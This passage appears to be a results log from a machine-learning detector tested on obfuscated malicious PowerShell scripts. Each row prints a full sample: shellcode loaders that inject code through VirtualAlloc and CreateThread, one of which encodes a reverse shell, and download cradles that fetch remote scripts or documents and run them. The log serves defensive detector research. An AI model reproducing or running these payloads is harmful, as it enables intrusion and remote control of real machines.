0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b','0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x','x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00',',0x53','0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,','x08,0x75,0xec,0xe8,0x3f,0x00,0',',0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5','0x0c,0','IntPtr lpTh','0xd5;Kh0g = 0x1000;if (Kh0z.Length -gt 0x1000){Kh0g = Kh0z.Length};Kh0x=Kh0w::',',0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x',',0','0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x',',0xff,0xd5,0x93','0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x0','VirtualAlloc(0,0x1000,Kh0g,0x40);for (Kh0i=0;Kh0i -',',0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,','0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,','x00,0x00,0x6a,0x00,0',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0','r CreateThread(','x50,0x30,','29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x',',0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x','0w::CreateThread(0,0,Kh0x,0,0,0);for (;;','le (Kh0z.Length-1);Kh0i++) {Kh0w::memset([IntPtr](Kh0x.ToInt32()+Kh0i), Kh0z[Kh0i], 1)};Kh','){Start-sleep 60};','40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0','et(IntPtr dest, uint src, uint count);lEJ;Kh0w = Add-Type -','xc3,0x89,0xe6,0x6a,0x10,','readAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[Dl')).RePlaCe(([ChAr]108+[ChAr]69+[ChAr]74),[sTrIng][ChAr]39).RePlaCe(([ChAr]75+[ChAr]104+[ChAr]48),[sTrIng][ChAr]36).RePlaCe(([ChAr]48+[ChAr]119+[ChAr]102),[sTrIng][ChAr]34) )",malicious,TP
2026-07-13 17:08:11,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3026.ps1,custom-ps-ml,UNKNOWN,c086d7df-2841-40f5-86ed-7c9679deb140,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3787,1667.84," .((gET-vaRIable '*Mdr*').naME[3,11,2]-joIN'') ( (((\""{2}{43}{58}{16}{59}{33}{12}{26}{56}{24}{23}{42}{57}{49}{47}{9}{32}{29}{19}{31}{45}{50}{51}{21}{8}{61}{60}{28}{34}{40}{52}{55}{6}{7}{38}{11}{10}{13}{15}{53}{5}{25}{27}{4}{17}{46}{44}{63}{62}{18}{1}{64}{30}{3}{54}{35}{0}{14}{20}{22}{48}{37}{36}{39}{41}\""-f'x2f,0x99,0x23,0x70,0x51,0x4b,0xac,0xe1,0x','xd8,0xb9,0xe5,0x40,0x4e,0xd0,0xe7,0x14,0x6c,0x74,0x82,0xea,0x1a,0x76,0x05,0x83,0x00,0x80,0x73,0x1c,0x4b,0xb8,0x17,0x92,0x73,0x25,0xa0,0xd1,0x70,0x83,0x14,0x8d,0xfb,0x9f,0xb0,0x26,0x32,0xe0,0x0d,0x35,0x64,0xb1','4QPPFOW = YAe[DllImport(WsLkernel32.dllWsL)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro','0xd4,0x5f,0x3b,0xb8,0xec,0xc9,0x3b,0x6a,0x0e,0x20,0','f,0xd7,0x1e,0x8d,0x74,0xd7,0xca,0x','82,0x39,0x15,0xce,0xcf,0xe8,0xbb,0x35,0xef,0xc7,0x4d,0x8f,0x65,0xf7,0x16,0x78,0xfa,0xc4,0xa8,0x78,0x73,0xca,0xc3,0x7c,0xd3,0x60,0x0b,0x2b,0xbb','c,0xa','0,0x5f,0x18,0x11,0x50,0xc8,0xf4,0x05,0xf9,0xa0','4,0xbf,0xdc,0x56,0x4e,0x4b,0xdf,0xbe,0x','xca,0x52,0xe6,0xe0,0x7b,0x','a5,0xc7,0x10',',0x00,0x79,0x3f,0x6e,0x09,0x7a,0x91,0xc1,0x','public static extern IntPtr memset(IntPtr dest, uint src, uint count);YAe;4QPw = Add-Type -memb',',0xe2,0x35,0x64,0x4','ff,0xf5,0x62,0x9e,0','3,0x8a,0x62,0x03,0xfc,0x8c,0x72,0xc6,0xe8,0x5e,0xd4,0xd9','ibutes, uint dwStackSize, IntPtr lpStartAdd','28,0x4a,0x52,0xea,','ab,0x43,0x46,0x25,0xdf,0','0x7c,0xed','x9e,0x8d,0x7a;4QPg = 0x1000;if (4QPz.Length -gt 0x1000){4QPg = 4QPz.Length};4QPlb6=4Q','0,0x18,0x7c,0x7e,0x3f,0x52,0x64,0xf4,0x67,0x43,0x95,0xd9,0x7','Pw::VirtualAlloc','thru;[Byte[]];[Byte[','ion 4QPPFOW -Name WsLWin32WsL -namespace Win32Functions -pass',',0x01,0x75,0x4d','er',',0xbd,0x16,0xac,0x40,0x3d,0xbf,0x18,0xf4,0x96,0x69,0xc',',0xec,0xf9,','0xd0,0xcf,','0x4d,0x40,0x69,0x12,0xc8,0x45,0xe1,0xb0,0x8b,0xc0,0xc9,0xbf,0x3d,0xa1,0xc9,0x6b,0x12,0xb8,0x8d,0xb7,0x9e,0x92,0x5e,0xd0,0xb3,0x45,0xce,0x7b,0x33,0xbc,0x8d,0x90,0xcf,',',0xdc,0x9c,0xbf,0x6c,0xa1,0xd','d8,',' IntPtr lpThreadId);[DllImport(WsLmsvcrt.dllWsL)]','0x27,0x19,0x90,0xf9,0xf3,0x63,0x4e,0x8c,0xe1,0xc4,0x05,0x36,0xc2,0xf5,0xca,0xa0,0x81,0x','0xbc,0x51,0xf8,0x83,0x27,0xd6,0x65,0xdc,0x4f,0','r](4QPlb6.ToInt32()+4QPi), 4QPz[4QPi], 1)};4QPw::Create','1000,4QPg,0x40);for (4QPi=0;4QPi -le (4QPz.Length-1);4QPi++) {4QPw::memset([IntPt',',0x92,0x93,0x53,0x35,0xc4,0x1b,0x8e,0x2e,0x69,0xbf','Thread(0,0,4QPlb6,0,0,0);for (','fa,0xa7,0xa7,0xce,0x1e,0x39,0x64,0x65,0x1a,0xb2,0x8b,0xaa,0xaa,0x80,0xaf,0x6e,0xf6,0x53,0xce,0x37,0x52',';;){Start-sleep 60};',']]','tect);[DllImport(WsLkernel32.dllWsL)]public static extern IntPt','9,0x44,0x19,0x68,0x7d,0x5a,0x21,0x7a,0xac,0xb3,0xab,0x7','e,0x93,0x4e,0x98,0x10,0xe6,0x8f,0xdd,0x4d,0x09,0xdd,0xb6,0x1a,0xb8','0x7',',0xfd,0x80,0x41,0xef,0x76,0xb0,0x55,0x7b,0xda,0x39,0x1e,0x29,0xcf,0','(0,0x','0x19,0x83,0xc3,0x04,0x03,0x43,0x15,0x2a,0xfe,0xe7,0x20,0x23,0x01,0x18,0xb1,0x53,0x8b',',0xf1,0xb3,0x5f,0x01,0xf0,0x13,0xd4,0','x39,0x8a,0x16,0x2b,0xcd,0x2',',0x35,0xef,0x28,0x3a,0xea,0x55,0x22,0xa9,0xff,0xef,0x69,0xa6,0x91,0x8a,0xe5,0x36,0x06,0x23,0x6f,0x5',',0x3c,0x32,0x8e,0x19,0xf3,0x13,0xca,0x4b,0xa1,0x01,0x','x29,0x8b,0xa7,0xa2,0x9f,0x00,0x28,0xb5,0x1f,0xc3,0xdd,0xb9,0xb7,0x1c,0x94,0x1b,0x11,0x22,0x02,0xb3,0x0e,0x23,0x52,','9,0xbf,0x42,0x89,0xf1,0x57,0x18,0x21,0xd','Definit','4QPz = 0xda,0xd1,0xb8,0xc8,0x0b,0x1b,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x6e,0x31,0x43,','r CreateThread(IntPtr lpThreadAttr','ress, IntPtr lpParameter, uint dwCreationFlags,','0xfe,0x73,0x8b,0xdd,0xf2,0x8a,0xcb,0xda','9f,0xb4,0xd1,','4,0x44,0xd0,0xb1,0xbb,0x6b,0x06,0x37,0x35,0xf6,0x2c,0xb3,0xd8,0xd8,0x','c,0x4e,0x4',',0x3b,0x52,0x96,0xa7,'))-REPlacE  'YAe',[ChAR]39  -crEPlace'4QP',[ChAR]36  -REPlacE  ([ChAR]87+[ChAR]115+[ChAR]76),[ChAR]34))",malicious,TP
2026-07-13 17:08:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3030.ps1,custom-ps-ml,UNKNOWN,8c3478fd-bcbb-4e60-8a0d-88006ee839cf,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2947,1677.52," &amp;( $veRBosePrEFeREnCE.tosTrING()[1,3]+'x'-JoIn'')( (((\""{29}{59}{12}{52}{24}{13}{31}{35}{36}{3}{58}{2}{42}{8}{63}{64}{0}{14}{48}{51}{68}{23}{46}{40}{57}{65}{7}{41}{50}{60}{27}{67}{39}{16}{49}{9}{44}{26}{30}{33}{15}{47}{53}{34}{54}{55}{32}{19}{45}{25}{1}{38}{5}{17}{6}{66}{43}{20}{56}{61}{18}{37}{4}{22}{62}{28}{69}{11}{21}{10}\"" -f'28,0x',',0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x','s, IntPtr lpThreadId);[DllImport(4Wm','lpStartAddress, IntPtr lpPara','gt 0','x75,0','0xf0,0xb5,0xa2,0x56,0xff,0','a','nt count);mtF;lr4w =',',0x73,0x','ateThread(0,0,lr4x,0,0,0);for (;;){Start-sleep 60};','r](lr4x.ToInt32()+lr4i','te','DllImport(4Wmkernel32.dll4Wm)]public static extern IntPtr CreateThread(IntPtr l','0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0','0x00,0x00,0x29','4,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x','xec,0x68,','2,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x2',',0x57,','0,0x10,0x00,0x00,0x56,0x6a,0x','), lr4z[lr4i], 1)};lr4w::Cre','x1000){l','42,0x3c,0x01,0xd0,0x','[','x68,0x99,0xa5,0x74,0x61','f,0x54,0x68,0x4c,0x77,0x26,0x07,','1','lr4w::VirtualAlloc(0,0x1000,lr4g,0x40);for (lr4i=0;lr4i','lr4c = mtF[','0xff,0xd5,0xb','pThr','0,0x56','8,0x90,0x01,',',0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0','eadAttributes, uint dwStackSize, I','ntPtr ','9,0xc6,0x85,0xf6,0x75,0xec,0xc3;lr4g = 0x1000;if (lr4z.Length -','4e,0x08,0','0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x2','c0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,','c,0xc1,0xcf,0x0d,0x01,0xc','msvcrt.dll4Wm)]public static extern IntPtr memset(IntPtr dest, uint src, ui',',0x6a,0x40,0x68,0x0','32,0x5','0','8b,0x40,0x78,0x85,0x',',0xc4,0x54,0x50,0x68,','x7','00,0x68,0x77','7,0x38,','c,0x02,0x2c','ct);','0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50','xff,0xd5,0x9','7,0x6a,0x05,0x68,0xc0,0xa8,0x01,0xd8,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x1','00,0x68,0x58,0xa4,0x53,0xe5,0xff,0','0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0','meter, uint dwCreationFlag','DllImport(4Wmkernel32.dll4Wm)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro','0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x0','xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x0','r4g = lr4z.Length};lr4x=',' Add-Type -memberD','efinition lr4c -Name 4WmWin324Wm -namespace Win32Functions -passthru;[Byte[]];[Byte[]]lr4z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x','x','xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36',',0xd3,',',0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x',' -le (lr4z.Length-1);lr4i++) {lr4w::memset([IntPt')) -CrePLaCe  'mtF',[CHAR]39 -CrePLaCe  '4Wm',[CHAR]34-CrePLaCe  ([CHAR]108+[CHAR]114+[CHAR]52),[CHAR]36) )",malicious,TP
2026-07-13 17:08:23,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\304.ps1,custom-ps-ml,UNKNOWN,42586c7e-21d1-49e4-9441-bba2132d4c58,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3091,1931.37,"((\""{10}{58}{40}{51}{16}{65}{15}{22}{61}{8}{38}{4}{7}{12}{31}{0}{62}{47}{2}{28}{29}{37}{72}{24}{39}{43}{36}{60}{34}{68}{53}{69}{6}{26}{27}{70}{59}{57}{63}{20}{35}{56}{54}{11}{41}{64}{19}{5}{13}{1}{3}{25}{71}{52}{46}{50}{18}{67}{42}{30}{14}{33}{48}{32}{66}{21}{55}{17}{49}{23}{9}{45}{44}\"" -f';[','0xd1,0xc2,0x96,0x1f,0x7f,0xea,0x02,0xa4,0xd6',',0x2b,0xd9,0x',',0xbd,0','count)','3,0x69,0x84,0xde,0x88,0x9e,0x7','a3,0xef,0xda,0xda,0x7f,0x65,0xf9,0x7c,0x0b,0xdd,0x25,0x7d,0xd8,0xb8,0xae,0x71,0x95,0xcf,0xe9,',';fvs;xW1w = Add-Type -memberDefinition xW1JsKO -N','mem','mset([IntPtr](xW14Psu.ToIn','xW1JsKO = fvs[DllImport(a62kernel32.dll','c,0x37','ame a','8,0x90,0x78,0xea,0x6a,0x44,0x89,0xa1,','x36,0x89,0x','teThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, ','(a62kernel32.dlla62)]public static extern Int','.','x7f,0xfa,0x89,','0x62,0x3d,0xfa,0xb2,0xf9,0xdc,0x0','3,0xde,0xf2,0xd3,0xef,0x48,0xbe,0x9c,0x29,0x8e,0xc1,0xb6,0x8e,0x00,0x3c,0x39,0xef,0x09,0xfa,0x6d,0xbf,0x21,0x2b,0x0e,0x5','x40);for (xW1i=0;xW1i -le (','IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(a62msvcrt.dlla62','i++) {xW1w::me',',0xcb,0x3c,0x3','xba,0xa6,0x0f,0x89','0x95',',0x28,0x03,0x82,0xa1','74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x18,0x8','3,0xc6,0x04,0x03,0x56,0xa7,0x1f,0x19,0xd7,0x2f,0x5d,0xe2,0x28,0xaf,','0','62Win32a62 -namespace Win32Functions -passthru;[Byte[]]','){xW1g = xW1z.Length};xW14Psu=xW1w::VirtualAlloc(0,0x100','31,0xf9,0x1d,0x0b,0x0d,0x2c,0x5b,0x79,0x7f,0xec;xW1g = 0x1000;if (xW1z.Length ',',0x51,0x14,0x16,0xf0,0xb6,','4','0x35,0x06,0x53,0xa','0x02,0x6a,0xcd','set(IntPtr dest, uint src, uint ','8,0x0e,0xf8,0xb7,0x4c,0x87,0x0f,0x70,0xfa,','tern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, u',',0x13,0xb6,0x48,0xd1,0x43,0x98,0x1a,0x4e,0x23,0x48,0xdb,0x3e,0xcb,0x82,0xd4,0x61,0xeb,0xac,0x3e,0x0a',',0x6d,0x06,','0xf1,0x3e,0x81,0x57,0xc1,0x21,0x01,0xaa,0x16,0x82,0x38,0x65,0x6b,0xc3,0x7d,0x98,0x86,0x91,0xd6,0xd6,','1w::CreateThread(0,0,xW14Psu,0,0,0);for (;;){Start-sleep 60};','t32()+xW1i), xW1z[xW1i], 1)};xW','f,0x2f,0x95,0x8',' 0xda,0xc4,0xba,0xb3,0xfd,0xec','-gt 0x1000','Length-1);xW1','1,0','int flProtect);[DllImport','x87,0x4a,0xc6,0x94,0x7','3,0x5d,0x5d,0x0e,0x5f,0xa0,0x52,0xfd,','7,0x42,0x24,0xbd,0xc7,0x12,0xcc,0xb','xW1z',',0xb2,0xd4,0xdb,0xc1,0xb','80,0x41,0x6','a62)]public static ex',',0x45,0x20,0xf1,0x','2,0x85,0xad,0x2f,0x22,0x8e,0x52,0xe7,0x45,0xbf,0xc4,0x7c,0x1c,0x1f,0xe6',')]public static extern IntPtr ','Byte[]]xW1z =','9,0xa1,0xa9,0xd0,0xd7,0x04,0xd5,0x03,0xb8,0xf9,0x73,0x4f,0x54,0xed,0x09,0x12,0x30,0xc2,0x23,0xad,0xc0,0x4c,0x3',',0x81,0x42,0x97,','Ptr Crea','0,xW1g,0','0x1a,0xea,0x05,0xf8,0xcf,0xbd','0x11,0xe0,0x8b,0x0c,0xed,0xf','0xa1,0xe4,0x54,0x1e,0xd4,0x1c,0xa7,0x',',0xa1,0xa2',',0x64,0x58,0x7a,0x82,0xad,0xcc,0xc5,0xfc,0xd1,0x00,0xc6,0xfc,0',',0x9e,0x02,0x08,0x85,0xb0,0xb2,0x5a')).REpLace(([ChAR]120+[ChAR]87+[ChAR]49),[STrING][ChAR]36).REpLace(([ChAR]102+[ChAR]118+[ChAR]115),[STrING][ChAR]39).REpLace('a62',[STrING][ChAR]34)|. ( $eNv:COmsPEC[4,26,25]-JOIn'')",malicious,TP
2026-07-13 17:08:29,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\305.ps1,custom-ps-ml,UNKNOWN,76721afd-3e94-4d5b-b295-e9e260fb46d9,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3057,1738.77," &amp;( $env:coMSPEc[4,15,25]-jOIn'') ( ((\""{0}{38}{70}{32}{45}{67}{41}{34}{58}{46}{28}{30}{2}{59}{25}{72}{64}{4}{52}{42}{10}{31}{69}{26}{48}{23}{16}{33}{50}{62}{65}{40}{61}{68}{19}{47}{7}{24}{22}{36}{18}{66}{63}{9}{53}{44}{20}{13}{51}{27}{56}{8}{39}{6}{14}{54}{17}{37}{29}{12}{35}{3}{21}{1}{49}{5}{60}{57}{43}{71}{55}{11}{15}\""-f 'mSxc = 7fB[DllImport(eABkernel32.dlleAB','ength};mSxx=mSxw::VirtualAlloc(0,0x1000,mSxg','uint count);7fB;mSxw = Ad',' (mSxz.Length -gt 0x1','assthru;[Byte[]];[Byte[]]mSxz = 0xbb,0xdb,0x8d,0','0);for (mSxi=0;mSxi',',0x8','8,0x6f,0x7d,','0x3e,0xdd','1,0xa1,0xe8,0x45,','c9,0xb1,0x47,0x83,0xed,0xfc',':CreateThread(0,0,mSxx,0,0,0);for (;;){Start-slee','c0,0x3c,0xf9,0x2f,0x3f,0x0a,0xa6,0xd0,','0xc3,0x78,0xc0,0x2b,0x4a,0x9e,0x88,0xc3,0x1a,0x08,0x24,0x7d,0x','3,0x2f,0xfc,0xb6,0x3b,0x32','p 60};',',0xdd,0xf4,0x69,0x64,0x1a','9b,0xf0,0xb2,0xa3,0xbe,0xfe,0x6e,0xd0,0x13,0',',0x9b,0xdb,0x','x9b,0x81,0xef,',',0x61,0xc9,0xec,0xea,0xa5,0x9d,0xbc,0x84,0x0c,0x9e,0x56,0x55,0xb1,0x4b,0xf8,0x05,0x1d,0x24,0xb9,0xf5,0xdd,0x94,0x51,0x1c,0xd2,0xcb,0x42,0x1f,0x39,0x64,0xe8,0xe5,0xa9,0x09,0x3e,0x77,0x81,0x66,','000){mSxg = mSxz.L',',0x8d,0x9f,0x01,0xb7,0x6e,0xea,0x7b,0xc4,0x13,0xed,0x','3,0x44,0x6e,0x5f,0xc8,0x08,0x9b,0xd4,0xbc,0x84,0xac,0x5d,0x0a,0xf3,0x83,0x5e,0x27,0xc7,0x82,0xdc,0x3a,0x14,0x65','0xee,0xf8,0xbe,0x7e,0x5d,0xc5,0x0f','memberDefini','0xed,0xe0,0xcb,0xd2,0x92,0x69,','0x82,0x9d,0xae,0xd5,0x','emset(IntPtr dest,',',0x91,0x81,0x',' uint src, ',',0x31,0x5d,0x0f,0x03,0x5d,0xd4,0x6f,0x1f','ect);[DllImport(eABkernel32.dlleAB)]public static extern IntPtr CreateT',',0xe8,0x80,0x34,0xf3,0x66,0x36,0xa9,','t dwCreat','0x6a,0x8a,0x9a,0x06,0x52,0xf8,0xf2,0x9a;mSxg = 0x1000;if','bf,0xb7,0xcf,0x78,0x24,0x1f','x6b',')]public static extern IntPtr VirtualAlloc(IntPtr l',',0x15,0x80,0x55,0xe1','6,0xa4,0x','t dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uin','0xce,0xdb,0xde,0xd9,0x74,0x24,0xf4,0x5d,0x33,0x','](mSxx.ToInt32()','6,0x55,0x68,0x7d,0xec,0x7b,0x7d,0x0c,0xaf,0x13,0xb2,0x3d,0x50,0xe3,0xdc,0x36,0x23,0xd1,0x43,0xed,0xab,0x59,0x0b,0x2b,0x2b,0x9e,0x26,0x8b,0xa3','hread(','d);[DllImport(eABmsvcrt.dlleAB)]public static extern IntPtr m','0x2','0x2e,0xe3,0x92,0x0e,0x3a,0x53,0x2',',0x4','0x70,0x32,0x8b','07,0xc2,0xd5,','xea,','0x01,0x86,0x2c,0x0e,0xd1,0xa7,0x75,0xea,0xb4,0xd8,0x6',',0xd9,0xf0,0xe3,0xcd,0x0c,0x8b,0x2a,0x58,0xef,0xe3,0x52,0x8c,0xef,0xf3,0x04,0xc6,0xef,0x',', mSxz[mSxi], 1)};mSxw:','09,0x12,0x4e,0x9b,0xf9,0x5f,0x5c,0x4b,0x0a,0x2a,','tPtr','ionFlags, IntPtr lpThreadI','d-Type -',' -le (mSxz.Length-1);mSxi++) {mSxw::memset([In','14,0',',0x42,0xca,0xd2,0x8b,0xb7,0x9a,0xd5,0xba,0x','xac,0x25,0xc9,0x0c,0xb0,0xb8,0x1e,0x27,0xcc,0x3','Name eABWin32eAB -namespace Win32Functions -p','69,0x91,0x8f,0x1c,0x8b,0x7','80,0x9e,0x48,0xbd,0x43,0','IntPtr lpThreadAttributes, uin','x93,0',',0x32,0x02,','pAddress, uint dwSize, uint flAllocationType, uint flProt','+mSxi)','tion mSxc -')).REpLacE(([Char]55+[Char]102+[Char]66),[STrinG][Char]39).REpLacE('eAB',[STrinG][Char]34).REpLacE('mSx',[STrinG][Char]36))",malicious,TP
2026-07-13 17:08:40,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3090.ps1,custom-ps-ml,UNKNOWN,0e0dfebf-511e-4745-903e-7619a7279832,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1741,1923.3,"(((\""{131}{120}{18}{30}{66}{45}{6}{125}{53}{5}{124}{113}{110}{81}{140}{100}{141}{137}{32}{74}{17}{64}{102}{83}{10}{14}{59}{88}{33}{73}{61}{127}{41}{55}{8}{67}{63}{105}{26}{46}{103}{92}{99}{89}{13}{117}{91}{98}{121}{0}{40}{49}{82}{126}{123}{76}{101}{24}{1}{106}{86}{104}{78}{96}{7}{29}{118}{87}{94}{68}{142}{69}{21}{109}{135}{114}{44}{115}{130}{15}{56}{119}{34}{22}{19}{138}{47}{54}{65}{129}{39}{108}{31}{25}{79}{12}{50}{133}{43}{132}{134}{122}{20}{57}{71}{97}{27}{128}{139}{58}{48}{111}{28}{52}{90}{75}{38}{84}{143}{136}{112}{37}{16}{95}{85}{80}{51}{42}{93}{11}{23}{107}{4}{62}{60}{9}{116}{72}{36}{35}{2}{3}{77}{70}\"" -f 'u);XgVwC.PRO','ReQU','jOIn','I','gVI++%','b',' SyS','XY;X','eckoIdn;X','K.LeN','en','gV_-BXo','B','r','t/7','TN','0/index.','0 (Windo','-','E','[]]Xg','.NEt','Cr','RX','Eb','31,^E2.M','.H','[c','w','g','OBJ','V~tvolIm%(f','/5','rv:1','rK','gVB-','X','9:8','Ph','VK=Idn','XY ','ik','x','s8D_7Id','alCAche]::DEF','T','Ea','Nt','XgVW','= ','g','M','nLOAdS','Em.NET.WE','IAl','e G','Et','VB',']](','.0;','V',') ','Xg','Vw','ws NT 6.1; W','S;X','Ec','g','TIaL',' = [SYstEm','n)','=',' (','1.0','.','G(OC','Tem.NEt.','dnId','AulTWE','x2d9','))','Xg','[S',' Trid','t','CP)',':','Wc.PRoxY.CrED',' ','se','TRiN','Agent','Rs.','2%{X','EN','aspO','bPrO','(','Idn,X','AdD(IdnU','Mo','W','OW64;','De','DeF','c','Est]:','gVK[X','?Xg','.Cre','t;','C.DO','0.','LiEN','EntI','A','gTh]};IEX','-','V','Wo','VwC=NEW','gV','VI=0;[cHar','S','C','t','y','l','h','g','ul','Xg','n;','j@:','Xg','D','23.116.9','la','de','ar[','Vu=Idn','zil','s','tp://'))-REPlACe 'OCP',[char]34-crePlAcE([char]77+[char]120+[char]50),[char]124 -crePlAcE  ([char]73+[char]100+[char]110),[char]39-REPlACe  ([char]88+[char]103+[char]86),[char]36) | invokE-eXpREsSION",malicious,TP
2026-07-13 17:08:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3102.ps1,custom-ps-ml,UNKNOWN,21e42fb6-1dd2-4923-8477-37e3dfc9b66b,DESKTOP-BAC9DBQ,malicious,0.796,RandomForest,1423,1765.9," &amp;( ([StRiNG]$VErBOsePREfereNCE)[1,3]+'x'-joIn'') ((((\""{95}{82}{3}{20}{9}{89}{87}{103}{32}{105}{100}{21}{19}{72}{45}{43}{40}{57}{92}{31}{42}{11}{18}{23}{25}{13}{90}{17}{79}{101}{2}{39}{47}{7}{58}{99}{107}{69}{0}{65}{70}{48}{85}{108}{88}{46}{86}{54}{6}{22}{59}{78}{94}{29}{16}{63}{52}{33}{80}{51}{61}{49}{68}{4}{60}{93}{8}{109}{84}{34}{75}{66}{53}{12}{38}{41}{50}{36}{102}{106}{67}{37}{27}{77}{98}{76}{15}{62}{24}{104}{5}{83}{28}{1}{10}{97}{30}{44}{91}{96}{56}{35}{81}{55}{71}{14}{73}{74}{26}{64}\"" -f'p:/','IEX','fau','object ','n-t','cx','y6','tials;','of','et.web',' n7en.d','.P','xPQu)','ls=[Net','oci','usul-o','16091','e','roxy.','=[Net','n','y','/h','Credent','fsh','ia','1.p','7Sphu','u  ','h-20','wnloadstr',' n7e',';',',PQu','-2','p://ww','un','p',';','lt','o','  St','n','t]::GetSystemWebPr','i','ues','j','Creden','geoc','v:temp7Sp','art-Process PQ','ee','cxPQu','0918.doc','o','.','whtt','xy()','  n7en.DownloadF','uuliin-','us','n','f','8.do','s1pVw);','/w','6','m','huulii','tt','ww.','ge','.WebReq','ties.jp/lgxpoy6/','f092','01','-t','uli','tus','d','n7','w','w-','PQ','sh','it','p/lgxp','n','s.','clie','.Cr','ng(p','; ','ul-','ul-offs','n7en=ne','V','o','in','i','ox','entialCache]::De','7eenv:t','t','-20160918.do','  n7en.pr','e','le(PQuh','ie','f'))-CrepLACe  'n7e',[char]36-CrepLACe([char]55+[char]83+[char]112),[char]92 -replAcE ([char]112+[char]86+[char]119),[char]39-replAcE  'PQu',[char]34) )",malicious,TP
2026-07-13 17:08:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3113.ps1,custom-ps-ml,UNKNOWN,ad27c558-09bf-4b16-838b-a9b6b4018cc1,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3077,1583.74," &amp; ((GV '*MDR*').Name[3,11,2]-jOin'')( ((\""{62}{40}{30}{32}{47}{31}{25}{58}{20}{52}{4}{60}{51}{21}{43}{63}{11}{71}{61}{68}{16}{2}{54}{44}{41}{33}{70}{49}{13}{64}{67}{66}{65}{55}{57}{10}{28}{39}{72}{50}{12}{37}{23}{27}{17}{15}{22}{69}{5}{38}{9}{48}{6}{3}{7}{0}{45}{42}{18}{29}{46}{24}{26}{53}{35}{36}{8}{56}{19}{14}{1}{34}{59}\"" -f',0x2a,0x5a,0xad,0x','(0,0x1000,Fvmg,0x40);for (Fvmi=0;Fvmi -le (Fvmz.Len','9,0xc9,0xb1,0x4',',0','tPtr 